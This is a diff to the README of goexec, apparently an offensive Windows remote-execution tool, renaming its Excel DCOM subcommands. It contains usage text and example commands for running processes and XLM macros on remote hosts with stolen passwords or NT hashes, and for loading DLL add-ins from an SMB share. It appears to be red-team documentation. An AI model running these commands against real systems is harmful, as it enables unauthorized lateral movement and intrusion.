@@ -208,8 +208,6 @@ Available Commands:
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
   htafile            Execute with the HTAFile DCOM object
-  excel-macro        Execute with the Excel.Application DCOM object by executing an Excel macro
-  excel-xll          Execute with the Excel.Application DCOM object by registering an XLL add-in
   vs-dte             Execute with the VisualStudio.DTE object
 
 ... [inherited flags] ...
@@ -384,45 +382,6 @@ goexec dcom htafile "$target" \
   --url "http://callback.lan/payload.hta"
 ```
 
-#### Excel `ExecuteExcel4Macro` Method (`dcom excel-macro`)
-
-The `excel-macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
-An Excel installation must be present on the remote host for this method to work.
-
-```text
-Usage:
-  goexec dcom excel-macro [target] [flags]
-
-Execution:
-  -M, --macro string           XLM macro
-      --macro-file file        XLM macro file
-  -e, --exec executable        Remote Windows executable to invoke
-  -a, --args string            Process command line arguments
-  -c, --command string         Windows process command line (executable & arguments)
-  -o, --out file               Fetch execution output to file or "-" for standard output
-  -m, --out-method string      Method to fetch execution output (default "smb")
-      --out-timeout duration   Output timeout duration (default 1m0s)
-      --no-delete-out          Preserve output file on remote filesystem
-
-... [inherited flags] ...
-```
-
-##### Examples
-
-```shell
-# Execute `query session` + print output
-goexec dcom excel-macro "$target" \
-  --user "${auth_user}@${domain}" \
-  --password "$auth_pass" \
-  --command 'query session' -o-
-
-# Use admin NT hash to directly call a Win32 API procedure via XLM
-goexec dcom excel-macro "$target" \
-  --user "${auth_user}@${domain}" \
-  --nt-hash "$auth_nt" \
-  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
-```
-
 #### Visual Studio `ExecuteCommand` Method (`dcom vs-dte`)
 
 The `vs-dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
@@ -465,14 +424,69 @@ goexec dcom vs-dte "$target" \
   --args '/c set' -o-
 ```
 
-#### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel-xll`)
+#### Excel Methods (`dcom excel`)
 
-The `excel-xll` method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
+The `dcom excel` command group contains remote execution methods targeting Microsoft Excel.
+Each of these methods assume that the remote host has Excel installed.
+
+```text
+Usage:
+  goexec dcom excel [command] [flags]
+
+Available Commands:
+  macro       Execute using Excel 4.0 macros (XLM)
+  xll         Execute by Loading an XLL add-in
+
+... [inherited flags] ...
+```
+
+#### Excel `ExecuteExcel4Macro` Method (`dcom excel macro`)
+
+The `excel macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
+An Excel installation must be present on the remote host for this method to work.
+
+```text
+Usage:
+  goexec dcom excel macro [target] [flags]
+
+Execution:
+  -M, --macro string           XLM macro
+      --macro-file file        XLM macro file
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Execute `query session` + print output
+goexec dcom excel macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'query session' -o-
+
+# Use admin NT hash to directly call a Win32 API procedure via XLM
+goexec dcom excel macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
+```
+
+#### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel xll`)
+
+The `xll` method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
 This method requires that the remote host has Microsoft Excel installed.
 
 ```text
 Usage:
-  goexec dcom excel-xll [target] [flags]
+  goexec dcom excel xll [target] [flags]
 
 Execution:
       --xll path   XLL/DLL local or UNC path
@@ -484,13 +498,13 @@ Execution:
 
 ```shell
 # Use admin password to execute XLL/DLL from an uploaded file
-goexec dcom excel-xll "$target" \
+goexec dcom excel xll "$target" \
   --user "${auth_user}" \
   --nt-hash "$auth_nt" \
   --xll 'C:\Users\localuser\Desktop\file.xll'
 
 # Use admin NT hash to execute XLL/DLL from an SMB share
-goexec dcom excel-xll "$target" \
+goexec dcom excel xll "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
   --xll '\\smbserver.lan\share\addin.xll'
